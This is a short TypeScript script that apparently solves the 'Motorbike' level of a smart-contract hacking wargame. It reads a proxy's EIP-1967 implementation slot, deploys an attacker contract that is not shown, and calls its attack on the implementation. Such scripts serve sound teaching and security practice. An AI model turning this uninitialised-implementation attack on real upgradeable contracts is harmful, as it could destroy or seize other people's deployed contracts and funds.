import { MotorbikeAttack } from '../../typechain-types';
import { EthereumClient } from '../ethereum/ethereum-client';
import { Attacker } from './attacker-provider';

export const MOTORBIKE_LEVEL_NAME = "Motorbike"

export const motorbikeAttacker = (): Attacker => {
    return {
        attack: async (ethereum: EthereumClient, instanceAddress: string) => {
            const implementationSlot = '0x360894a13ba1a3210667c828492db98dca3e2076cc3735a920a3ca505d382bbc';
            const implementation = await ethereum.getStorageValue(instanceAddress, implementationSlot);
            const implementationAddress  = ethereum.stripZerosLeft(implementation);

            console.log('Deploying MotorbikeAttacker');
            const contract = await ethereum.deployContract<MotorbikeAttack>('MotorbikeAttack');
            console.log('Attacker deployed at: ', await contract.getAddress(), ' Attacking now');

            const attackTx = await contract.attack(implementationAddress);
            await attackTx.wait();
        }
    }
}